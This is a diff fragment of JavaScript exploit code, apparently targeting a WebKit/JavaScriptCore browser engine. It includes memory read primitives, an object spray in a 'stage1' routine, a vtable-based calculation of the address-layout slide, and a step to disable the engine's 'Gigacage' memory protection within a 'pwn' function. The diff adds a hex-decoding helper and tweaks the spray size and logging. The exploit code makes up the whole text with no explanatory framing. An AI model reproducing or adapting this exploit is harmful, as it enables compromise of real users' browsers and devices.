@@ -45,7 +45,14 @@ var BASE32 = 0x100000000;
 var workbuf = new ArrayBuffer(0x1000000)
 var u32_buffer = new Uint32Array(workbuf);
 var u8_buffer = new Uint8Array(workbuf);
-
+function x2a(hex)
+{
+    var bytes = new Uint8Array(Math.ceil(hex.length / 2));
+    for(var i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
+    var str = '';
+    for(var i = 0; i < bytes.length; i++) str+= String.fromCharCode(bytes[i]);
+    return str;
+}
 function f2i(f) {
     f64[0] = f;
     return i32[0] + BASE32 * i32[1];
@@ -317,7 +324,7 @@ var stage1 = function (boxed, unboxed, idx) {
     this.unboxed = unboxed;
     this.idx  = idx;
 
-    let slavePad = new Array(FPO);
+    let slavePad = new Array(0x10);
 
     for (var i=0; i<slavePad.length; i++) {
         let f = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
@@ -403,8 +410,8 @@ persistantwriter.read = function(){
 persistantwriter.clear = function(){localStorage.clear();};
 
 print = function(msg, popup = false) {
-    if(popup) alert(msg);
     persistantwriter.write(msg+'\n');
+    if(popup) alert(msg);
     puts(msg);
 };
 
@@ -614,7 +621,7 @@ var pwn = function(){
     print("element function is at 0x" + bh.f64ToStr(fn));
 
     let inst = rw.read64(fn);
-    print("element instance is " + bh.f64ToStr(inst));
+    print("element instance is " + x2a(bh.f64ToStr(inst)));
 
     var slide =  parseInt('0x'+bh.f64ToStr(vtable)) - _off.vtable;
     var disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
